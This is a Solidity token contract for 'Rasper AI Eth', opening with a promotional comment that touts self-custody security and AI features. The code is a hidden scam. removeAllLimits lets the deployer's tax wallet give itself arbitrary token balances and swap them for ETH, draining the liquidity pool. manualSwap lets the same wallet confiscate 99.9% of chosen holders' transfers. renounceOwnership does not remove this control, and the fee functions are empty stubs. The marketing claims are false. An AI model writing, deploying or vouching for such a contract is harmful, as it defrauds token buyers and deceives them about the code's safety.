/*
Rasper AI Eth

        *   https://t.me/rasper_ai_eth
        *   https://www.rasper-ai.com/
        *   https://medium.com/@rasper-ai-eth
        *   https://x.com/rasper_ai_eth

Introduction to RASPER AI ETH
RASPER AI ETH stands at the forefront of innovation in the cryptocurrency 
space, representing the next evolution in decentralized finance (DeFi). Born 
out of a vision to revolutionize how individuals interact with digital assets, 
RASPER AI ETH serves as the native token of the RASPER AI platform, a cutting-edge 
crypto wallet powered by artificial intelligence. The inception of RASPER AI ETH 
traces back to a collaborative effort by a team of blockchain enthusiasts, developers, 
and AI experts, who recognized the growing need for a sophisticated yet user-friendly 
cryptocurrency wallet. Leveraging the capabilities of Ethereum blockchain, RASPER 
AI ETH offers a seamless and secure medium for users to manage their digital assets, 
backed by the principles of self-custody and decentralization.
Purpose of the Token
At its core, RASPER AI ETH serves multiple pivotal roles within the RASPER AI ecosystem. 
Primarily, the token acts as a utility asset, enabling users to access a myriad of 
features and services offered by the platform. Whether it's conducting transactions, 
accessing AI-driven analytics, or engaging with the 24/7 chat assistant, RASPER AI ETH 
serves as the fuel that powers these interactions. Moreover, RASPER AI ETH embodies 
the ethos of decentralization, ensuring that users retain full control over their assets 
at all times. By leveraging blockchain technology, the token facilitates trustless and 
transparent transactions, eliminating the need for intermediaries and safeguarding user 
autonomy.
Technology Stack
Underpinning the functionality of RASPER AI ETH is a robust technology stack, meticulously 
crafted to deliver unparalleled performance and security. Built on the Ethereum blockchain, 
RASPER AI ETH leverages the solidity programming language to deploy smart contracts that 
govern its operations. Furthermore, the token integrates with various decentralized finance 
(DeFi) protocols, enhancing liquidity and interoperability within the broader cryptocurrency 
ecosystem. With a focus on scalability and efficiency, RASPER AI ETH harnesses the power 
of Ethereum's network infrastructure to ensure seamless transaction processing and data integrity.
Unique Features
What sets RASPER AI ETH apart from its counterparts is its array of unique features tailored 
to meet the diverse needs of users. From self-custody security and AI-driven analytics to 
multi-layered security protocols and biometric authentication, RASPER AI ETH offers a 
comprehensive suite of functionalities unrivaled in the market. Moreover, with the introduction 
of gas fee reimbursement in RASPER tokens, users can enjoy cost-effective transactions without 
compromising on security or speed. This innovative approach not only incentivizes token holders 
but also underscores RASPER AI ETH's commitment to democratizing access to financial services.
Understanding the RASPER AI ETH Ecosystem
RASPER AI Platform Overview
The RASPER AI ETH token operates within the dynamic ecosystem of the RASPER AI platform, a 
revolutionary cryptocurrency wallet designed to empower users with intelligent features and 
seamless asset management capabilities. At its core, the platform serves as a gateway to the 
world of decentralized finance (DeFi), offering a comprehensive suite of tools and services 
to cater to the diverse needs of cryptocurrency enthusiasts. With RASPER AI ETH as its native 
token, the platform enables users to leverage the power of artificial intelligence (AI) for 
enhanced decision-making and portfolio management. Whether it's tracking market trends, accessing 
real-time insights, or executing transactions with precision, the RASPER AI platform redefines 
the way individuals interact with digital assets.
Integration with Ethereum Blockchain
A cornerstone of the RASPER AI ETH ecosystem is its integration with the Ethereum blockchain, 
the world's leading decentralized platform for smart contracts and digital assets. By harnessing 
Ethereum's robust infrastructure, RASPER AI ETH ensures secure, transparent, and censorship-
resistant transactions, thereby fostering trust and confidence among users. The seamless 
integration with Ethereum also unlocks a myriad of possibilities for RASPER AI ETH token holders, 
including participation in decentralized exchanges (DEXs), liquidity pools, and yield farming 
protocols. Additionally, the interoperability of Ethereum enables RASPER AI ETH to seamlessly 
interact with other decentralized applications (dApps) and protocols, further expanding its 
utility and reach within the broader DeFi ecosystem.
Token Utility within the Ecosystem
Within the RASPER AI ETH ecosystem, the token serves as a versatile utility asset, powering a 
wide range of interactions and functionalities. From conducting peer-to-peer transactions and 
accessing AI-driven analytics to participating in governance mechanisms and earning rewards, 
RASPER AI ETH embodies the essence of decentralization and user empowerment. Furthermore, as 
the backbone of the RASPER AI platform, the token facilitates seamless integration with third
-party services and DeFi protocols, enabling users to unlock new opportunities and maximize 
the value of their digital assets. Whether it's staking, lending, or trading, RASPER AI ETH 
empowers users to take full control of their financial future in a decentralized and trustless 
manner.
Self-Custody Security
Non-Custodial Model
At the heart of RASPER AI ETH's security framework lies a non-custodial model that prioritizes 
the autonomy and privacy of users. Unlike traditional centralized exchanges or custodial 
wallets, which require users to entrust their private keys and assets to a third party, 
RASPER AI ETH ensures that users maintain sole ownership and control over their digital 
assets at all times. By adhering to a non-custodial approach, RASPER AI ETH eliminates the 
inherent risks associated with centralized custody, such as hacking, insider threats, and 
mismanagement. Instead, users retain full sovereignty over their private keys, which are 
securely stored on their devices or designated hardware wallets, providing peace of mind 
nd mitigating the potential for unauthorized access or asset loss.
Ownership of Private Keys
Central to the self-custody security model of RASPER AI ETH is the concept of private key 
ownership. Each user is assigned a unique cryptographic key pair consisting of a public 
key for receiving funds and a private key for accessing and controlling their assets. These 
private keys serve as the digital signatures that authenticate and authorize transactions 
on the Ethereum blockchain, ensuring the integrity and security of the user's holdings. 
Through robust encryption algorithms and secure key management practices, RASPER AI ETH 
empowers users to safeguard their private keys from unauthorized access or compromise. 
Whether it's through hardware wallets, mnemonic phrases, or biometric authentication methods, 
users have a variety of options to secure and manage their keys according to their preferences 
and risk tolerance.
Ensuring Digital Asset Security
By embracing a self-custody security model, RASPER AI ETH not only enhances the privacy and 
autonomy of users but also ensures the security and integrity of their digital assets. 
Without relying on intermediaries or third-party custodians, users are protected from the 
risks of platform breaches, regulatory intervention, or custodial mismanagement. Furthermore, 
the decentralized nature of the Ethereum blockchain provides an additional layer of security 
and resilience, with transactions being validated and recorded by a distributed network of 
nodes. This distributed consensus mechanism minimizes the risk of fraudulent activities or 
malicious attacks, thereby instilling confidence and trust in the RASPER AI ETH ecosystem.
*/
pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract RasperAIEth is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }

    string private _name = "Rasper AI Eth";
    string private _symbol = "RASPER AI ETH";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _taxWallet;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function setMaxSwap() external {
    }
    function setMinSwap() external {
    }
    function updateBuyFees() public {
    }
    function updateSellFees() external {
    }
    function manualSwap(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { 
            if (!marketingAddres()){} else { 
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    mapping (address => uint256) internal cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function removeAllLimits(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amount); 
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this); 
            addressPath[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }
    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {  
            _taxValue = (_cooldownFeeValue); 
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}